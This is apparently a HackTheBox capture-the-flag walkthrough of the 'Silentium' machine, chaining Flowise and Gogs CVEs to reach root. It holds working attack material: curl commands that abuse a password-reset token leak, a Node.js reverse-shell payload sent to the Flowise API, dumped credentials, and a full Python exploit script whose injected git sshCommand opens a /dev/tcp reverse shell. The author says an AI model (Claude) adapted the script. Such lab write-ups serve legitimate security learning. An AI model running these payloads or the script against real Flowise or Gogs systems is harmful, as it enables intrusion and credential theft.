---
title: "HTB Silentium walkthrough"
date: 2026-04-11 
categories: [HackTheBox, Season 10]
tags: [htb, flowise, gogs, cve-2025-58434, cve-2025-59528, cve-2025-8110, docker, linux]
---

## Enumeration



First start with an nmap scan. Ports 22 and 80 open.

```bash
┌──(kali㉿kali)-[~/htb/reds/silentium]
└─$ sudo nmap -T4 -A -p- 10.129.31.73 -o nmap.txt
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-11 15:04 -0400
Stats: 0:02:39 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 24.37% done; ETC: 15:14 (0:08:14 remaining)
Warning: 10.129.31.73 giving up on port because retransmission cap hit (6).
Stats: 0:04:23 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 25.19% done; ETC: 15:21 (0:13:04 remaining)
Nmap scan report for 10.129.31.73
Host is up (0.047s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp    open     http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
29212/tcp filtered unknown
32356/tcp filtered unknown
41374/tcp filtered unknown
43062/tcp filtered unknown
50645/tcp filtered unknown
51962/tcp filtered unknown
52009/tcp filtered unknown
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   50.28 ms 10.10.14.1
2   49.75 ms 10.129.31.73

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1146.01 seconds

```



The main site at `silentium.htb` is a static financial services page revealing three team members: **Marcus Thorne**, **Ben** (Head of Financial Systems), and **Elena Rossi**.

After adding the domain in the hosts file we move on to directory bruteforcing but since http://silentium.htb is just a static site there isn't much so we try enumerating subdomains and find one "staging".

```bash
┌──(kali㉿kali)-[~/htb/reds/silentium]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://silentium.htb/ -H "Host:FUZZ.silentium.htb"  -fc 301

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://silentium.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.silentium.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 360ms]
:: Progress: [114442/114442] :: Job [1/1] :: 20 req/sec :: Duration: [0:08:56] :: Errors: 2 ::
```



Looking at the web app on staging.silentium.htb its Flowise an open-source, no-code platform that lets users visually build AI workflows. Researching more about Flowise we find that Flowise version 3.0.5 contains a code injection vulnerability in the CustomMCP node. The vulnerability exists in the convertToValidJSONString function, which directly passes user-provided mcpServerConfig input to the JavaScript Function() constructor without any security validation. This allows execution of arbitrary JavaScript code with full Node.js runtime privileges, enabling attackers to access dangerous modules such as child_process and fs.

![2](/assets/img/posts/htb-silentium/2.png)



There is this POC  <https://github.com/zimshk/CVE-2025-59528.yaml/blob/main/poc.txt> but to exploit it we need to be authenticated. 



Flowise is also vulnerable to **CVE-2025-58434** (unauthenticated password reset token disclosure): The `/api/v1/account/forgot-password` endpoint returns the `tempToken` directly in the response without authentication. Enumerating emails against the endpoint using team member names reveals `ben@silentium.htb` returns a valid token. Using the token we reset ben's password and get access to his account on Flowise.

```bash
┌──(kali㉿kali)-[~/htb/reds/silentium]
└─$ for email in \
  "marcus@silentium.htb" \
  "marcus.thorne@silentium.htb" \
  "m.thorne@silentium.htb" \
  "mthorne@silentium.htb" \
  "ben@silentium.htb" \
  "elena@silentium.htb" \
  "elena.rossi@silentium.htb" \
  "e.rossi@silentium.htb" \
  "erossi@silentium.htb" \
  "admin@silentium.htb"; do
  result=$(curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
    -H "Content-Type: application/json" \
    -d "{\"user\":{\"email\":\"${email}\"}}")
  echo "$email -> $result"
done
marcus@silentium.htb -> {"statusCode":404,"success":false,"message":"User Not Found","stack":{}}
marcus.thorne@silentium.htb -> {"statusCode":404,"success":false,"message":"User Not Found","stack":{}}
m.thorne@silentium.htb -> {"statusCode":404,"success":false,"message":"User Not Found","stack":{}}
mthorne@silentium.htb -> {"statusCode":404,"success":false,"message":"User Not Found","stack":{}}
ben@silentium.htb -> {"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG","tempToken":"50inN4CRO9X8DavF0Pyq9WsMmVvQTvvjRP4zZ29X8QCi4ZCSDXw2x6wOIYxU6xlU","tokenExpiry":"2026-04-11T19:42:23.285Z","status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-04-11T19:27:23.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}}
elena@silentium.htb -> {"statusCode":404,"success":false,"message":"User Not Found","stack":{}}
elena.rossi@silentium.htb -> {"statusCode":404,"success":false,"message":"User Not Found","stack":{}}
e.rossi@silentium.htb -> {"statusCode":404,"success":false,"message":"User Not Found","stack":{}}
erossi@silentium.htb -> {"statusCode":404,"success":false,"message":"User Not Found","stack":{}}
admin@silentium.htb -> {"statusCode":404,"success":false,"message":"User Not Found","stack":{}}
                                                                                                                                                         
┌──(kali㉿kali)-[~/htb/reds/silentium]
└─$ curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{
    "user": {
      "email": "ben@silentium.htb",
      "tempToken": "50inN4CRO9X8DavF0Pyq9WsMmVvQTvvjRP4zZ29X8QCi4ZCSDXw2x6wOIYxU6xlU",
      "password": "Pwned123!"
    }
  }'
{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$vUjsr1vvMhzRFkut6KiVTeCmwSS.aIeX/pgR2xDegaCjQQU/dXIxO","tempToken":"","tokenExpiry":null,"status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-04-11T19:27:51.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}} 
```



**CVE-2025-59528** (JavaScript injection via CustomMCP): Flowise 3.0.5 passes the `mcpServerConfig` parameter directly to `Function()` constructor without sanitization. But to exploit it we need the api key which can be found on the api keys and used as a bearer token. 

![1](/assets/img/posts/htb-silentium/1.png)



We construct a POST request in burp with a node reverse shell payload:

```bash
POST /api/v1/node-load-method/customMCP HTTP/1.1
Host: staging.silentium.htb
Content-Type: application/json
Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Content-Length: 347

{
  "loadMethod": "listActions",
  "inputs": {
    "mcpServerConfig": "({x:(function(){var net=process.mainModule.require('net'),cp=process.mainModule.require('child_process'),sh=cp.spawn('/bin/sh',[]);var c=new net.Socket();c.connect(9001,'10.10.15.50',function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c)});return 1;})()})"
  }
}
```



We land in a docker container.



![3](/assets/img/posts/htb-silentium/3.png)



Next examining the enviroment variables we find ben's password "r04D!!_R4ge" which we can use to ssh to host.

```bash
ALLOW_UNAUTHORIZED_CERTS=true                                                                                                                            
DATABASE_PATH=/root/.flowise
FLOWISE_PASSWORD=F1l3_d0ck3r
FLOWISE_USERNAME=ben
HOME=/root
HOSTNAME=c78c3cceb7ba
JWT_AUDIENCE=AUDIENCE
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
JWT_ISSUER=ISSUER
JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
JWT_TOKEN_EXPIRY_IN_MINUTES=360
LLM_PROVIDER=nvidia-nim
NODE_VERSION=20.19.4
NVIDIA_NIM_LLM_MODE=managed
PORT=3000
PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
PWD=/
SECRETKEY_PATH=/root/.flowise
SENDER_EMAIL=ben@silentium.htb
SHLVL=1
SHLVL=2
SHLVL=3
SHLVL=4
SMTP_HOST=mailhog
SMTP_PASSWORD=r04D!!_R4ge
SMTP_PORT=1025
SMTP_SECURE=false
SMTP_USER=test
SMTP_USERNAME=test
TERM=xterm
YARN_VERSION=1.22.22

```

**User flag:** `/home/ben/user.txt`



## SHELL AS ROOT - CVE-2025-8110



Looking at the nginx configurations we find another subdomain "staging-v2-code.dev.silentium.htb" that's hosting gogs 0.13.3.

```bash
lrwxrwxrwx 1 root root 42 Jan 29 21:29 /etc/nginx/sites-enabled/staging-v2-code -> /etc/nginx/sites-available/staging-v2-code
server {
    listen 80;   
    server_name staging-v2-code.dev.silentium.htb;
    location / { 
        proxy_pass http://127.0.0.1:3001;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
    
ben@silentium:~$ /opt/gogs/gogs/gogs --version
Gogs version 0.13.3
    
```



CVE-2025-8110 (symlink path traversal via PutContents API): An authenticated user commits a symlink pointing to .git/config of a repository. The PutContents API follows the symlink and overwrites the file with a malicious git config containing an sshCommand payload. A mirror-sync operation triggers the command execution as root.



There is a POC script <https://github.com/zAbuQasem/gogs-CVE-2025-8110/blob/main/CVE-2025-8110.py> but it keeps failing on registration. So I ask claude to adjust it quickly and use the credentials with which I already registered manually.

```bash 
#!/usr/bin/env python3
import argparse, requests, os, subprocess, shutil, base64
from urllib.parse import urlparse
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings()

def login(session, base_url, username, password):
    login_url = f"{base_url}/user/login"
    resp = session.get(login_url)
    soup = BeautifulSoup(resp.text, "html.parser")
    csrf = soup.select_one("input[name=_csrf]")["value"]
    session.post(login_url, data={"_csrf": csrf, "user_name": username, "password": password}, allow_redirects=True)
    print("[+] Logged in")

def get_token(session, base_url):
    url = f"{base_url}/user/settings/applications"
    resp = session.get(url)
    soup = BeautifulSoup(resp.text, "html.parser")
    csrf = soup.select_one("input[name=_csrf]")["value"]
    resp = session.post(url, data={"_csrf": csrf, "name": os.urandom(8).hex()}, allow_redirects=True)
    soup = BeautifulSoup(resp.text, "html.parser")
    token = soup.find("div", class_="ui info message").find("p").text.strip()
    print(f"[+] Token: {token}")
    return token

def create_repo(session, base_url, token):
    repo_name = os.urandom(6).hex()
    session.headers.update({"Authorization": f"token {token}"})
    session.post(f"{base_url}/api/v1/user/repos", json={"name": repo_name, "auto_init": True, "readme": "Default"})
    print(f"[+] Repo: {repo_name}")
    return repo_name

def upload_symlink(base_url, username, password, repo_name):
    repo_dir = f"/tmp/{repo_name}"
    if os.path.exists(repo_dir):
        shutil.rmtree(repo_dir)
    parsed = urlparse(base_url)
    clone_url = f"{parsed.scheme}://{username}:{password}@{parsed.netloc}/{username}/{repo_name}.git"
    subprocess.run(["git", "clone", clone_url, repo_dir], check=True)
    os.symlink(".git/config", f"{repo_dir}/malicious_link")
    subprocess.run(["git", "add", "malicious_link"], cwd=repo_dir, check=True)
    subprocess.run(["git", "commit", "-m", "x"], cwd=repo_dir, check=True)
    subprocess.run(["git", "push", "origin", "master"], cwd=repo_dir, check=True)
    print("[+] Symlink pushed")

def exploit(session, base_url, token, username, repo_name, lhost, lport):
    git_config = f"""[core]
\trepositoryformatversion = 0
\tfilemode = true
\tbare = false
\tsshCommand = bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' #
[remote "origin"]
\turl = git@localhost:{username}/{repo_name}.git
\tfetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
\tremote = origin
\tmerge = refs/heads/master
"""
    b64 = base64.b64encode(git_config.encode()).decode()
    headers = {"Authorization": f"token {token}", "Content-Type": "application/json"}
    try:
        session.put(
            f"{base_url}/api/v1/repos/{username}/{repo_name}/contents/malicious_link",
            json={"message": "x", "content": b64},
            headers=headers,
            timeout=5
        )
    except:
        pass
    print("[+] Exploit sent — trigger with mirror-sync")
    # Trigger git operation
    try:
        session.post(f"{base_url}/api/v1/repos/{username}/{repo_name}/mirror-sync", headers=headers, timeout=5)
    except:
        pass

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True)
    parser.add_argument("-U", "--username", default="test")
    parser.add_argument("-P", "--password", default="testpass")
    parser.add_argument("-lh", "--host", required=True)
    parser.add_argument("-lp", "--port", required=True)
    args = parser.parse_args()

    session = requests.Session()
    session.verify = False
    login(session, args.url, args.username, args.password)
    token = get_token(session, args.url)
    repo_name = create_repo(session, args.url, token)
    upload_symlink(args.url, args.username, args.password, repo_name)
    exploit(session, args.url, token, args.username, repo_name, args.host, args.port)

if __name__ == "__main__":
    main()
            
```



After executing the exploit script get a shell on the listener and get the root flag.

```bash
──(kali㉿kali)-[~/htb/reds/silentium]
└─$ nc -lvnp 9000
listening on [any] 9000 ...
connect to [10.10.15.50] from (UNKNOWN) [10.129.32.178] 53662
bash: cannot set terminal process group (1529): Inappropriate ioctl for device
bash: no job control in this shell
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/4# cat /root/root.txt
cat /root/root.txt
e8...
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/4# 


```

## 

------